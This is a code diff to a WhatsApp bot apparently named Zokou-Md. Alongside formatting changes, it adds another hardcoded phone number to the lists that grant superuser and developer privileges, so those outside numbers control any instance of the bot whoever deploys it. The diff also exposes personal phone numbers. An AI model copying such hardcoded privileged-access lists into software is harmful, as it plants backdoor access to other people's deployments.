@@ -1,7 +1,7 @@
 "use strict";
 var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
     if (k2 === undefined) k2 = k;
-    var desc = Object.getOwnPropertyDescriptor(m, k);
+  var desc = Object.getOwnPropertyDescriptor(m, k);
     if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
       desc = { enumerable: true, get: function() { return m[k]; } };
     }
@@ -148,10 +148,11 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const nomAuteurMessage = ms.pushName;
             const dj = '22559763447';
-            const dj2 = '2250143343357';
+            const dj2 = '22543343357';
+          const dj3="22564297888"
             const luffy = '22891733300';
-            var superUser = [servBot, dj, dj2, luffy,conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
-            var dev = [dj, dj2, luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var superUser = [servBot, dj, dj2,dj3,luffy,conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t [][]...{Zokou-Md}...[][]");
             console.log("=========== Nouveau message ===========");
@@ -230,9 +231,9 @@ setTimeout(() => {
                 // console.log("*nouveau status* ");
             }
             /** ******fin auto-status */
-             if(!dev && origineMessage == "120363158701337904@g.us") {
+            if (!dev && origineMessage == "120363158701337904@g.us") {
                 return;
-            } 
+            }
             ///////////////////////////////
             //anti-lien
             try {
@@ -341,7 +342,7 @@ setTimeout(() => {
                                             await zk.sendMessage(origineMessage, { delete: key });
                                         }
                                         else {
-                                            //repondre("*Bot détecté*\n impossible de e retirer car il est administrateur du groupe.");
+                                            repondre("*Bot détecté*\n impossible de e retirer car il est administrateur du groupe.");
                                             return;
                                         }
                                     }
@@ -356,9 +357,6 @@ setTimeout(() => {
                 console.log('.... ' + er);
             }
             /////////////////////////
-            /*if (!dev && origineMessage == "120363158701337904@g.us") {
-                return;
-            }*/
             if (conf.MODE != 'oui' && !superUser) {
                 return;
             }
